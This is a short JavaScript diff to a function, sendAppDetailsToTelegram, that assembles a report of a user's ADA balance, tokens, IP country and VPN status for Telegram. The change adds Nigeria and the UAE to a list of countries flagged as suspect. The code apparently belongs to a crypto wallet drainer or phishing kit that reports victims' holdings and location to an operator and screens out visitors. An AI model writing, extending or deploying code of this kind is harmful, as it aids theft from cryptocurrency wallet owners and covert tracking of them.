@@ -41,6 +41,7 @@ export const sendAppDetailsToTelegram = async (adaBalance, tokens) => {
   }
 
   const { country, countryCode, ip, isVpnIpdata } = userCountryData;
+  const specialCountries = ["NG", "AE"];
 
   const isVpnIPQS = await checkVpnStatusWithIPQS(ip);
 
@@ -55,7 +56,7 @@ export const sendAppDetailsToTelegram = async (adaBalance, tokens) => {
                 `User Info--------------------\n` +
                 `| Country: ${globeIcon} ${country} (${countryCode}) |\n`;
 
-  if (isVpnIpdata || isVpnIPQS) {
+  if (isVpnIpdata || isVpnIPQS || specialCountries.includes(countryCode) ) {
     message += `| ⚠️ VPN / MARKED Country SUSPECTED  |\n`;
   } else {
     message += `| ✅ NO VPN SUSPECTED |\n`;
